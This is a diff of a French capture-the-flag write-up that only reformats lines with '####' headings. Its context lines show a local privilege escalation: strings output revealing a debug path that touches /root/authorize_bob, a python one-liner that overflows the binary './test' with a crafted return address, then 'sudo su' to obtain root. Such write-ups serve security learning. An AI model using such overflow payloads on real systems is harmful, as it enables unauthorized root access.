@@ -115,8 +115,8 @@ _strings test_
 Et parmis les reponses de cette commande nous voyons un : 
 
 
-*lancement debug*
-*touch /root/authorize_bob*
+####*lancement debug*
+####*touch /root/authorize_bob*
 
 ![Scan](https://user-images.githubusercontent.com/39098396/62124099-a94bd280-b2c9-11e9-9601-55e73c8f0e6b.png)
 
@@ -149,7 +149,7 @@ _python -c 'print ("123456789abcdefghijkl"+"\x20\x48\x55\x55\x55\x55")' | ./test
 
 nous voyons bien le lancement du debug 
 
-nous pouvons ensuite faire un sudo su 
+nous pouvons ensuite faire un ####sudo su 
 et nous somme root ! 
 
 ![Scan](https://user-images.githubusercontent.com/39098396/62123614-9b498200-b2c8-11e9-98c8-4d3719e493c6.png)
